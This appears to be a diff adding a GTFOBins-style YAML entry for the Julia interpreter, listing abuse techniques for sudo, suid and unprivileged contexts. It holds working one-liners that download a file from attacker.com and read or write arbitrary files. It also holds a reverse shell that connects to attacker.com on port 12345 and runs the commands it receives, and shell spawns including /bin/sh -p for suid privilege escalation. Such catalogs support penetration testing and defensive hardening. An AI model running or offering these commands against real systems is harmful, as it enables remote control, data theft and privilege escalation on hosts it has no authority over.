@@ -1,0 +1,43 @@
+---
+functions:
+  download:
+  - code: |-
+      julia -e 'download("http://attacker.com/path/to/input-file", "/path/to/output-file")'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    sender: http-server
+  file-read:
+  - code: |-
+      julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  file-write:
+  - code: |-
+      julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  reverse-shell:
+  - code: |-
+      julia -e 'using Sockets; sock=connect("attacker.com", parse(Int64, 12345)); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    listener: tcp-server
+  shell:
+  - code: |-
+      julia -e 'run(`/bin/sh`)'
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          julia -e 'run(`/bin/sh -p`)'
+        shell: false
+      unprivileged:
+...
